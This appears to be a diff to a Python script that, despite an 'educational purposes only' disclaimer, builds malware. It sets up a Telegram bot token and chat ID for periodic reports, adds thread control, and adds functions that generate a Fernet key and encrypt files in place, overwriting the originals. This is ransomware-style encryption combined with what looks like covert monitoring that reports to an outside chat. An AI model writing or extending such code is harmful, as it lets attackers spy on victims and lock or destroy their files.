@@ -1,3 +1,11 @@
+# DISCLAIMER
+# This script is for educational purposes only. Use it responsibly and ethically.
+# Ensure you have permission to run this script on the system,
+# and that its operation complies with all relevant laws and regulations.
+
+
+
+
 # Standard library imports for network communication and system-level operations.
 import socket  # Provides access to the BSD socket interface for networking.
 import platform  # Access to underlying platform’s identifying data.
@@ -44,3 +52,24 @@ SEND_REPORT_EVERY = 60
 # Telegram settings
 telegram_token = 'your_telegram_bot_token'  # Replace with your token
 telegram_chat_id = 'your_chat_id'  # Replace with your chat ID
+
+# Global flag for thread termination
+stop_threads = False
+
+# Function Definitions
+def generate_encryption_key():
+    key = Fernet.generate_key()
+    with open(file_path + extend + 'filekey.key', 'wb') as filekey:
+        filekey.write(key)
+    return key
+
+def encrypt_file(file_name, key):
+    try:
+        fernet = Fernet(key)
+        with open(file_name, 'rb') as file:
+            original = file.read()
+        encrypted = fernet.encrypt(original)
+        with open(file_name, 'wb') as encrypted_file:
+            encrypted_file.write(encrypted)
+    except Exception as e:
+        print(f"Error encrypting file {file_name}: {e}")
